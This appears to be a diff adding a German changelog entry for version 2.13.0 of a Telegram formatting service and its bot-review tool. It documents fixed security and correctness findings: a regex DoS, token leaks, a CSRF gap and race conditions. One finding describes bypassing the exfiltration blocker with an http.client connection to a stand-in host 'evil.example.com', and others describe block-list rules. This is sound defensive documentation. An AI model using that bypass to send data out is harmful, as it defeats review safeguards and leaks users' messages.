@@ -4,6 +4,307 @@ Alle relevanten Änderungen an diesem Projekt, formatiert nach
 [Semantic Versioning](https://semver.org/) und
 [Keep a Changelog](https://keepachangelog.com/de/1.0.0/).
 
+## [2.13.0] - 2026-09-27
+
+Minor-Release: Code-Review über den gesamten Stack (Peer-Review-Bericht:
+`peer-review/2026-09_CODE-REVIEW-V2.13.0.md`). 23 Befunde, alle behoben und
+mit einem Regressionstest abgesichert.
+
+Rückwärtskompatibel auf der API-Ebene: keine Endpoint-Änderung, keine
+ENV-Umbenennung, keine Datenmigration. Zwei Verhaltensänderungen sind für
+Betreiber relevant und in „Changed" mit Messwerten benannt: der Rich-Pfad
+erzeugt wieder sendbare Chunks, und ein 429 führt nicht mehr zum Abbruch.
+`/api/byob/session` akzeptiert zusätzlich `application/x-www-form-urlencoded`
+(vorwärtskompatibel — JSON bleibt der Normalfall).
+
+### Fixed — Security
+
+- **Quadratischer Fence-Regex (DoS, unauthentifiziert).** Die Info-String-
+  Gruppe `` ```([^\n]*)\n `` bekommt keine `sre`-Literal-Tail-Optimierung und
+  frisst an jeder der ~n Kandidatenpositionen Zeichen für Zeichen bis zum
+  Zeilenende. Enthält der Text kein `\n` — bei einer Anfrage voller Backticks
+  regelmäßig der Fall — scheitern **alle** Positionen nach O(n) Fehlversuchen.
+  `markdown_to_html("`" * n)`: 0,024 s / 0,112 s / 0,394 s für n = 2 000 /
+  4 000 / 8 000, **~60 s** beim Eingabelimit von 100 000 Zeichen. Bei
+  `CONVERTS_PER_MINUTE=60` pro IP und 8 Gunicorn-Threads genügt das, um die
+  Instanz dauerhaft zu blockieren.
+  Neu: gemeinsames, vorkompiliertes `_FENCE_BLOCK_RE` mit ``([^`\n]{0,64})``.
+  **0,070 s** statt ~60 s (≈850×), und linear statt quadratisch. Zusätzlich
+  CommonMark-konform: die Info-String eines Backtick-Fences darf kein Backtick
+  enthalten, `` ```a`b `` war vorher fälschlich als Fence geschluckt.
+- **Bot-Token im Klartext in der URL.** `<form id="byobForm">` hatte weder
+  `method` noch `action`; der HTML-Default ist GET. `byob.js` verhindert das
+  per `preventDefault()`, aber nur wenn das Skript lädt. Ohne JavaScript, bei
+  einem 404 oder vor dem Listener-Anlegen wäre ein Klick auf „Eigene
+  Bot-Session starten" zu `GET /?token=123456789:AAE…` navigiert — und damit
+  in die Adressleiste, die Browser-Historie **und das Caddy-Access-Log**
+  (`docker compose logs proxy`, jeder Log-Shipper, jeder Screenshot). Voller
+  Bot-Übernahme-Angriff; machte die eigene Zusage der Seite („nie gespeichert,
+  nie geloggt") ungültig.
+  Neu: `method="post"` + `action`, `POST`-Body-Rückgabe in `_json_or_form_body()`
+  und `_consent_given()` (eine angehakte Checkbox sendet `"on"`, nicht `true`).
+- **`compare_digest` auf `str` → 500 statt 401.** `hmac.compare_digest` wirft
+  für Nicht-ASCII-`str` einen `TypeError`. WSGI dekodiert Header nach
+  PEP 3333 als latin-1, gunicorn ebenso: ein Client, der ein einzelnes Byte
+  `0xE4` mitsendet, erzeugt reproduzierbar einen 500er auf **allen**
+  token-geschützten POSTs — und bei aktiviertem Browser-Versand auf dem
+  gesamten anonymen Shared-Send-Pfad. Neu: Vergleich über Bytes
+  (`_token_matches`).
+- **Bot-Token in der Exception-Chain.** `botkit/telegram_api._post` benutzte
+  `from exc`; `str(requests.exceptions.ConnectionError)` enthält den vollen
+  Pfad `/bot<BOT_ID>:<35 Zeichen Geheimnis>/getMe` und damit das Token im
+  Klartext. Damit leckte es in jedes `logging.exception`, jedes
+  `traceback.print_exc()` und jeden Flask-Debug-Traceback — bei jedem Aufrufer,
+  der `install_privacy_filters()` nicht benutzt. `sender.py` machte es seit
+  jeher richtig; dieses Modul jetzt genauso (`from None`). Verifiziert:
+  `TOKEN in traceback.format_exc()` → `False`.
+- **BK004 (Exfiltrations-Blocker) über `http.client`/`urllib3` umgehbar.**
+  BK004 prüft nur Aufrufe, deren aufgelöster Name auf einen HTTP-Methodennamen
+  *und* eine bekannte Modulwurzel zeigt. In
+  `c = http.client.HTTPSConnection("evil.example.com")` / `c.request(...)` ist
+  `root == "c"`, also lief die Prüfung nie — `botctl review` meldete „keine
+  Befunde" und ein zweizeiliger Bypass genügte, um einen „geprüften" Bot jede
+  Nachricht an einen Angreifer senden zu lassen. Neu: `urllib3` in
+  `FORBIDDEN_IMPORTS`, Prüfung der Verbindungskonstruktoren am String-Argument
+  (`_CONNECTION_CLASSES`, `host_is_bare_host`), BK010 für Folgeaufrufe über ein
+  Alias-Handle. Der erlaubte Host bleibt erlaubt.
+
+### Fixed — Korrektheit
+
+- **Rich-Pfad erzeugte nicht sendbare Chunks.** Es wurden **alle** offenen
+  Marker-Ebenen geschlossen, aber nur `_RICH_MAX_CARRY` Ebenen in den
+  Folge-Chunk getragen — `closing` wuchs dadurch unbegrenzt.
+  `"$x$ " + "**~~" * 8000` ergab **64 004** Zeichen, `"$x$ " + "<u>" * 10900`
+  **76 304** (Limit 32 768) — Telegram antwortet 400 `MESSAGE_TOO_LONG`, es
+  wurde also nichts zugestellt. Die Eingabe liegt mit 32 700 Zeichen klar unter
+  `SHARED_WEB_MAX_INPUT_CHARS`. Neu: Schließer auf die innersten
+  `_RICH_MAX_CARRY` Ebenen kappen — genau die Zusage, die der Docstring von
+  `_RICH_MAX_CARRY` seit v2.11.1 machte. Nachher 32 012 bzw. 32 720.
+- **Leere Chunks brachen den ganzen Versand ab.** `_dangling_tail` konnte den
+  kompletten Chunk zurückgeben (Chunk beginnt mit `<a href="` und wird mitten
+  in einer 4000-Zeichen-URL geschnitten); der Rest war der leere String, und
+  `build_messages` filterte ihn nicht. `sendMessage` beantwortet einen leeren
+  Text mit 400 `message text is empty`. Gemessen: `"[x](https://a/" + "a"*
+  4000 + ")"` ergab Chunk-Größen `[0, 0, 4021]`. Neu: `_dangling_tail` gibt
+  nie den ganzen Chunk zurück, `_rebalance_html_chunks` verwirft leere Chunks
+  zusätzlich.
+- **`_rebalance_html_chunks` war unbeschränkt.** Bei 1000 Ebenen tiefem Stack
+  hängte die Funktion 1000 Schließer an → 7001 Zeichen, das 4096-Limit
+  gerissen. Über `build_messages` heute nicht erreichbar, die Funktion selbst
+  war es schon. Ein nicht geschlossenes HTML-Tag lehnt Telegram zusätzlich mit
+  400 `can't parse entities` ab, der Überschuss kann also nicht wegfallen: der
+  Öffner des Überschusses wird aus der Ausgabe entfernt, der Inhalt bleibt als
+  Klartext.
+- **Vereinzelte UTF-16-Surrogate → 500 statt 400.** `{"text": "\ud800"}` ist
+  syntaktisch gültiges JSON (reine ASCII-Bytes auf dem Draht, von jeder
+  UTF-8-Validierung nicht zu beanstanden), erzeugt aber einen *ungepaarten*
+  Surrogate, an dem `utf-16-le` scheitert. Auf den Sendewegen kam Schlimmeres
+  dazu: `requests` kann denselben String nicht als JSON-Body kodieren, und
+  `UnicodeEncodeError` ist **keine** `RequestException` — der Fehler entkam also
+  `sender.py`, und ein halb zugestellter Versand wurde als undurchsichtiger 500
+  gemeldet. Neu: `_has_lone_surrogate()` weist an der Eingangsgrenze mit 400 ab.
+- **`Origin: null` durchwunk die CSRF-Prüfung.** `if parsed.netloc and ...`
+  übersprang den Fall, dass `Origin: null` (Sandboxed-iframe, `file://`,
+  Redirect-Verläufe) keinen `netloc` hat. Schwächer, als der Docstring
+  behauptete. Neu: leerer `netloc` ist kein gleicher Ursprung → 403.
+- **Leerzeilen gingen beim Splitting verloren.** `re.split(r"\n\s*\n", text)`
+  ist über Zeilengrenzen gierig (`"a\n\n\n\nb"` → `"a\n\nb"`) und
+  `if p.strip()` verwarf reine Whitespace-Absätze. Bei `$$…$$` verlor der
+  Pfad zusätzlich die führende Einrückung (`if ln != ""` + `part.strip()`), was
+  das Rendering mehrzeiliger Display-Formeln **nur an der Teilungsgrenze**
+  veränderte. Die Oberfläche verspricht ausdrücklich „Leerzeilen zwischen
+  Absätzen bleiben erhalten". Neu: Schnitt auf genau eine Leerzeile, Trenner
+  mitgeführt, Formel-Split ohne `.strip()`.
+
+### Fixed — Betrieb
+
+- **`botctl send` druckte bei jedem Telegram-Fehler einen rohen Traceback.**
+  `SendError` ist ein *Geschwister* von `SessionError` (beide `RuntimeError`,
+  keine Verwandtschaft) und wurde nicht abgefangen. Damit wurden der
+  `except`-Vertrag („✖ Versand abgebrochen") **und** das `finally` mit
+  `scrub_environment` umgangen — der wahrscheinlichste Fehlerfall des
+  Kommandos war der einzige mit Stacktrace.
+- **Review-Gate konnte bei CRLF nie freigeben.** `submit()` reichte
+  `report.source_sha256` ein (über `read_text`, das CRLF zu LF normalisiert),
+  `verify()` prüfte `source_sha256` (über `read_bytes`). Bei einem
+  CRLF-Checkout (`core.autocrlf`, Windows) waren die Werte nie gleich — die
+  Freigabe war dauerhaft unmöglich, mit einer Fehlermeldung, die auf
+  `botctl review` verwies und damit nicht weiterhalf. Neu: Bindung über die
+  **Bytes**; `submit()` nimmt den bereits berechneten Report entgegen
+  (vorher doppeltes Lesen und Analysieren mit TOCTOU-Fenster).
+- **Audit-Trail wurde in place gekürzt.** `write_text` öffnet mit `"w"` und
+  kürzt sofort. Der `flock` verhindert gleichzeitige *Schreiber*, aber keinen
+  Kill, keine volle Platte und keinen Stromausfall zwischen Kürzen und letztem
+  Byte — danach „ist beschädigt", und mit dem Trail sind **alle** Freigaben
+  verloren. Neu: Temp-Datei + `os.replace` (atomar auf POSIX und Windows).
+- **Statische Analyse lief doppelt, `response.json()` doppelt.** `botctl review`
+  las und analysierte die Datei zweimal; zwischen beiden Lesevorgängen konnte
+  jemand editieren, sodass am Bildschirm ein Report erschien, für den nie ein
+  Ticket existierte. `sender.send_message` dekodierte den Antwort-Body zweimal
+  — bei nicht seekbarem Response (Gzip, Stream, Test-Stub) ist der Zweitaufruf
+  nicht idempotent und `retry_after` ging verloren. Neu: `_read_error_body()`.
+- **Zwei Erfolgspraedikate für dieselbe API.** `sender` benutzte
+  `body.get("ok") is False`, `telegram_api` `if not body.get("ok")`. Bei
+  `{"result": null}` ohne `ok`-Schlüssel wertete das eine als Erfolg
+  (inkrementierte `chunks_sent`), das andere als Fehler. Neu: ein Praedikat,
+  Erfolg nur bei explizitem `ok is True`.
+- **Rate-Limit-Eimer wurden nie geraumt.** `_prune_rate_buckets` prüfte nur
+  `not hits`. Ein Client mit genau *einer* Anfrage hinterlässt aber ein
+  `deque` mit einem Zeitstempel; das wird erst geleert, wenn derselbe Key
+  zurückkehrt — und zwar nach dem Prune-Aufruf. Ein-shot-Adressen (bei IPv6
+  jeder /64-Präfix) sammelten sich dauerhaft an. Neu: Sweep nach Alter, dazu
+  gedrosselt auf `_RATE_PRUNE_INTERVAL` (60 s) statt bei *jedem* Request ein
+  O(n)-Iterieren unter dem globalen Lock.
+
+### Fixed — botkit
+
+- **429-Backoff fehlte, ein Abbruch verbrauchte das Budget des ganzen Stapels.**
+  `retry_after` wurde durch die gesamte Schicht gereicht und dann nie beachtet
+  (Checkliste C6 nur halb umgesetzt). `_reserve_rate_budget(len(messages))`
+  buchte vor dem Versand alle Plätze: ein Abbruch bei Chunk 7 von 17 verbrauchte
+  das Budget für alle 17. Neu: Retry mit Backoff (**begrenzt** auf 3 Versuche
+  und 5 s Wartezeit — ein unbeschränkter `retry_after` würde bei 1 Worker /
+  8 Threads die Instanz einfrieren), `_release_rate_budget` gibt nicht
+  gesendete Plätze zurück, `_touch()` nach jedem Chunk statt am Stapelende.
+- **Keine Sperre in `BotSession`.** Der Modulkommentar zu Audit M-7 hält fest,
+  dass Dikt-Mutationen unter Threads ohne Lock problematisch sind, und
+  `SessionManager` bekam daraufhin eine — `BotSession` nicht.
+  `_reserve_rate_budget` war ein nicht-atomares Read-Modify-Write: zwei
+  parallele `POST /api/byob/send` konnten beide `len(...) == 5` lesen und beide
+  `5 + 12 > 20` passieren. Das 20-Nachrichten-pro-Minute-Limit — dessen
+  ausdrücklicher Zweck „Schutz vor Telegram-Sperren" ist — war umgehbar. Neu:
+  `threading.RLock` um Check und Buchung.
+- **`BotRegistry` hatte dieselbe Lücke.** `get()` las und löschte (ein
+  zwischenzeitliches `register()` wäre vernichtet worden), `purge_expired()`
+  iterierte über `dict.items()`, während ein anderer Thread darin `del`
+  ausführte → `RuntimeError: dictionary changed size during iteration`. Neu:
+  Sperre, bedingtes Löschen, Liste unter der Sperre bilden.
+- **`register()` löschte jede bestehende Freigabe.** `register()` baute einen
+  frischen `RegistrationRecord` (status `PENDING`,
+  `approved_source_sha256=None`) und überschrieb damit den alten. Registrieren
+  ist der Normalpfad beider Aufrufer — eine an eine Code-Prüfsumme gebundene
+  Freigabe wäre bei jedem zweiten `open()` stillschweigend hinfällig gewesen.
+  Neu: vorhandenen Datensatz in place aktualisieren.
+- **`revoke()` setzte `REVOKED` und löschte im nächsten Schritt.** Der Status
+  war nicht beobachtbar, und `_require()` meldete danach „nicht (mehr)
+  registriert" statt „widerrufen". Neu: Record behalten.
+- **`byob/session` hielt den Kapazitäts-Lock über den `getMe`-Round-Trip.**
+  Bei 8 Threads stellten sich 8 gleichzeitige Session-Eröffnungen bis zu
+  8 × 15 s = 2 min hintereinander; die ganze Instanz stand still, inklusive
+  `/` und `/healthz`. Neu: Verifikation außerhalb, Kapazitätsprüfung
+  weiterhin unter der Sperre (mit Nachprüfung).
+- **BK002 meldete gewöhnliche Builtins als BLOCKER.** `PERSISTENCE_CALLS` wird
+  gegen den letzten Namensbestandteil geprüft und enthält `set`, `remove` und
+  `save` — damit waren `seen = set()`, `results.remove(x)` und `cfg.save()`
+  Blocker. `seen = set()` stoppte jedes Review. Der Methodenname trägt keine
+  Information über die Zielklasse. Neu: BK002 nur bei auflösbarem
+  persistenzverdächtigem Empfänger, sonst BK010 („nicht prüfbar").
+- **`open(p, "r+")` war ein False Negative.** Die Prüfung war
+  `any(flag in mode for flag in ("w", "a", "x"))`; `+` heißt lesen *und*
+  schreiben. Neu: Positivliste, `open(p)` gilt korrekt als `open(p, "r")`.
+- **`import random` ergab kein BK012**, `from random import choice` schon.
+- **Ein hartkodiertes Token ergab zwei BK006-Befunde** auf derselben Zeile
+  (`visit_Assign` **und** `visit_Constant`), die als Duplikate im Audit-Trail
+  landeten — 4 Befunde für 2 Probleme. Neu: `visit_Constant` ist der einzige
+  Melder.
+
+### Added
+
+- **`MAX_CHUNKS_PER_REQUEST` / `max_chunks_per_send` (Default 25).** Der Weg
+  von der Eingabe zu den Chunks war ungedeckelt: 64 000 Zeichen → 17 Chunks,
+  100 000 → 23, jeder ein API-Aufruf mit `timeout=15.0`, sequenziell im
+  Request-Handler, also in einem von nur 8 Gunicorn-Threads. Im Worst Case
+  bindet eine Anfrage 23 × 15 s = 345 s einen Thread; zwei bis drei
+  gleichzeitige anonyme Anfragen erschöpfen den Pool und die Instanz
+  antwortet dann auch auf `/` und `/healthz` nicht mehr.
+  Der Default ist bewusst **25** — genau die Chunkzahl der dokumentierten
+  Eingabelimits — damit **keine dokumentierte Fähigkeit verkleinert** wird.
+  Wer ihn senkt, muss auch `TELEGRAM_FORMATTER_SHARED_WEB_MAX_INPUT_CHARS`
+  senken.
+- `InMemoryTokenVault.max_entries` (Default 1000): `store()` verdrängte
+  nichts, und `purge_expired()` wurde von niemandem aufgerufen — der Vault wäre
+  unbegrenzt gewachsen. `store()` räumt jetzt abgelaufene Einträge und
+  verdrängt den ältesten, bis Platz ist.
+- `_json_or_form_body()` und `_consent_given()` für den Nicht-JS-Fallback von
+  `/api/byob/session`.
+- `TelegramAPIError.retry_after`: ein 429 wurde als „HTTP 429" ohne Wartezeit
+  gemeldet, wodurch der Session-Betrieb in wiederholte 429er lief.
+- `docs/RUNBOOK.md` (Betrieb, Diagnose, Notfall) und `docs/FAQ.md` — die
+  Anleitung, die bei `ERR_SSL_PROTOCOL_ERROR` und „502 Bad Gateway" fehlte.
+  Jeder Befehl in **fish** und **bash**.
+
+### Changed
+
+- Version `2.12.0` → `2.13.0`.
+- `docs/DOCKER.md` um einen Abschnitt zum **geteilten Proxy** ergänzt: der
+  bisherige Text kannte nur den eigenständigen Stack (`app:5000` auf
+  `appnet`). Genau aus dieser Lücke entstand im nas-server-Stack die
+  recommendete, aber falsche Zeile `reverse_proxy host.docker.internal:5000`
+  für einen Dienst, der bewusst keinen Host-Port veröffentlicht.
+- Falsche Sicherheits-Zusage korrigiert: es gibt **keine Verschlüsselung im
+  Ruhezustand** (repo-weit kein Treffer auf `Fernet|AES|ChaCha|nonce|pbkdf2|
+  argon2|encrypt|decrypt|cryptography`). Die Zusage lautet „nur im
+  Arbeitsspeicher, nie auf einem dauerhaften Medium".
+- Zwei Docstrings entschärft, die einen automatischen Hintergrund-Reaper
+  behaupteten, den es nicht gibt: `SessionManager` räumt nur bei einem Zugriff
+  auf (`open`/`get`, sowie `app.py` vor jedem `/api/byob/*`). Eine Session kann
+  ihre 30-Minuten-TTL damit um beliebig viel überschreiten, solange niemand sie
+  anfasst — begrenzt durch `BYOB_MAX_SESSIONS_TOTAL` (100).
+- `botkit/privacy.py` und `botkit/review.py`: Kommentare nennen jetzt die
+  konkrete Regel-ID statt einer Sammelreferenz.
+
+### Tests
+
+- 87 neue Tests (**609 passed**, 1 jsdom-Smoke übersprungen wie bisher;
+  vorher 522 passed). Jeder Befund hat mindestens einen Regressionstest mit
+  dem Messwert oder dem konkreten Fehlerbild, nicht nur eine Behauptung.
+  Schwerpunkte: ReDoS-Zeitgrenze (absolut und relativ), Chunk-Grenzen und
+  Leere-Chunk-Garantie, Roundtrip-Verlustfreiheit des Splitting, nicht-ASCII-
+  Header → 401, `Origin: null` → 403, Surrogat → 400, CRLF-Review-Gate
+  (Freigabe **muss** funktionieren), Ledger-Atomizität unter
+  `OSError(ENOSPC)`, `http.client`/`urllib3` als BK004, `set()` **ohne**
+  BK002, `r+` **mit** BK002, BK006-Deduplizierung, 429-Retry mit
+  Wartezeit-Bound, Budget-Rollback bei Teilversand, 20-Parallel-Threads gegen
+  das Rate-Limit, 4-Thread-`register`/`purge`-Kollision, Formular-POST ohne
+  JavaScript.
+- `ruff check .` fehlerfrei.
+
+### Notes / offene Punkte
+
+Diese Punkte wurden im Review geprüft und bewusst **nicht** geändert — sie sind
+keine Defekte, sondern Entwurfsentscheidungen. Sie sind hier festgehalten,
+damit sie beim nächsten Review nicht erneut untersucht werden müssen:
+
+- **Kein `parse_mode`-Fallback.** Telegram lehnt `sendMessage` mit
+  `can't parse entities` ab, wenn das generierte HTML nicht wohlgeformt ist.
+  Ein zweiter Versuch ohne `parse_mode` würde Text ohne Formatierung
+  zustellen — stiller Inhaltsverlust. Bewusst nicht implementiert; die
+  HTML-Erzeugung ist stattdessen auf Wohlgeformtheit getestet.
+- **Keine automatische Wiederholung von Netzwerkfehlern** (DNS, TLS-Reset) und
+  von 5xx. Die `send_message`-Schicht bleibt bei *einem* Versuch; nur 429 wird
+  mit Backoff wiederholt, weil dort die Wartezeit von Telegram geliefert wird.
+  Automatische Retries auf Verbindungsfehler würden Duplikate erzeugen, wenn
+  der erste Versuch doch zugestellt hat.
+- **`requests.Session` wird prozessweit geteilt.** `requests.Session` ist
+  laut Dokumentation nicht thread-sicher (mutiert `cookies` je Antwort). Unter
+  `--workers 1 --threads 8` ist das in der Praxis ein GIL-atomarer
+  Dict-Zugriff; es wurde **kein** Fehler reproduziert. `sender.py` bündelt
+  die Sessions deshalb nicht neu — das wäre eine Änderung ohne belegten
+  Anlass. `botkit/telegram_api._post` nutzt weiterhin `requests.post` ohne
+  Pooling.
+- **BK002 meldet weiterhin Attribut-Aufrufe mit nicht auflösbarem Empfänger**
+  als BK010 (nicht als Blocker „persistenzverdächtig"). Das bleibt R-2-konform
+  (nicht Verifizierbares ist nicht „sicher"), ist aber der häufigste Fall — die
+  Meldung fordert eine kurze Begründung im Code.
+- **Abhängigkeiten sind nicht vollständig gepinnt.** `requirements.txt` pinnt
+  die drei direkten Abhängigkeiten exakt, alle transitiven
+  (`urllib3`, `certifi`, `werkzeug`, `jinja2`, …) schweben, `--require-hashes`
+  fehlt, und `FROM python:3.11-slim` ist ein bewegliches Tag. Eine
+  vollständig gepinnte, gehashte Liste (`pip-compile --generate-hashes`) plus
+  Digest-Pin des Basis-Images wäre die konsequente Umsetzung von Checkliste C8
+  und ist bewusst als eigener Schritt gelassen (es ändert den Build und damit
+  die Reproduzierbarkeit des Images).
+
 ## [2.12.0] - 2026-09-24
 
 Minor-Release: produktionsreifes **Docker-Deployment mit Caddy** als
